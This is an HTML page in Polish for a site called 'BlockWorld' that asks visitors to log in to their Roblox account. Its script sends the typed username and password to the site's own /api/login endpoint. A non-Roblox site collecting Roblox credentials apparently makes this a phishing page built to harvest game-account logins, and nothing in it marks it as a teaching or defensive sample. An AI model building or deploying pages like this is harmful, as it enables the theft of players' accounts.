<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>BlockWorld – Logowanie</title>
  <style>
    body {
      margin: 0;
      background-color: #111; /* ciemne tło */
      color: #eee; /* jasny tekst */
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }
    nav {
      background-color: #222;
      border-bottom: 1px solid #444;
      padding: 1rem 2rem;
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: bold;
      font-size: 1.2rem;
    }
    nav .logo {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    nav .logo .square {
      width: 12px;
      height: 12px;
      background-color: #10b981; /* zielony */
      transform: rotate(45deg);
      display: inline-block;
    }
    nav .slogan {
      color: #999;
      font-weight: normal;
      font-size: 0.9rem;
    }

    main {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }

    .container {
      background-color: rgba(30, 30, 30, 0.8);
      backdrop-filter: blur(5px);
      border-radius: 16px;
      padding: 2rem;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 15px rgba(16, 185, 129, 0.5);
    }

    h1 {
      text-align: center;
      font-size: 2rem;
      margin-bottom: 0.5rem;
      font-weight: 900;
    }

    p.subtitle {
      text-align: center;
      color: #888;
      font-size: 0.9rem;
      margin-bottom: 1.5rem;
    }

    label {
      display: block;
      font-size: 0.9rem;
      margin-bottom: 0.3rem;
      font-weight: 600;
    }

    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 0.6rem 0.8rem;
      border-radius: 8px;
      border: 1px solid #444;
      background-color: #222;
      color: #eee;
      font-size: 1rem;
      margin-bottom: 1rem;
      box-sizing: border-box;
    }

    input[type="text"]:focus, input[type="password"]:focus {
      outline: none;
      border-color: #10b981;
      box-shadow: 0 0 5px #10b981;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      gap: 0.5rem;
      font-size: 0.9rem;
      margin-bottom: 1.5rem;
    }

    input[type="checkbox"] {
      width: 16px;
      height: 16px;
      accent-color: #10b981;
      cursor: pointer;
    }

    button {
      width: 100%;
      background-color: #10b981;
      color: white;
      font-weight: 700;
      font-size: 1.1rem;
      padding: 0.7rem 0;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #0f9e6e;
    }

    pre#out {
      background-color: #222;
      color: #eee;
      padding: 1rem;
      border-radius: 12px;
      font-size: 0.8rem;
      max-height: 15rem;
      overflow-y: auto;
      margin-top: 1rem;
      display: none;
      white-space: pre-wrap;
      word-wrap: break-word;
    }

    footer {
      text-align: center;
      font-size: 0.75rem;
      color: #666;
      padding: 1rem;
    }
  </style>
</head>
<body>
  <nav>
    <div class="logo">
      <span class="square"></span> BlockWorld
    </div>
    <div class="slogan">Z nami lepiej</div>
  </nav>

  <main>
    <div class="container">
      <h1>Zaloguj się</h1>
      <p class="subtitle">zaloguj się do swojego konta Roblox.</p>

      <form id="loginForm" novalidate>
        <label for="login-username">Login</label>
        <input id="login-username" name="username" type="text" placeholder="np. klockarz123" required />

        <label for="login-password">Hasło</label>
        <input id="login-password" name="password" type="password" placeholder="••••••••" minlength="8" required />

        <div class="checkbox-container">
          <input type="checkbox" id="rememberMe" />
          <label for="rememberMe" style="margin:0;">Zapamiętaj mnie</label>
        </div>

        <button type="submit">Zaloguj się</button>
      </form>

      <pre id="out"></pre>
    </div>
  </main>

  <footer>
    © 2025 BlockWorld
  </footer>

  <script>
    const out = document.getElementById("out");

    async function post(url, data) {
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        return await res.json();
      } catch (e) {
        return { error: "Brak backendu – demo frontendu.", detail: e.message };
      }
    }

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const data = Object.fromEntries(fd.entries());
      const res = await post("/api/login", data);
      out.style.display = "block";
      out.textContent = JSON.stringify(res, null, 2);
    });
  </script>
</body>
</html>
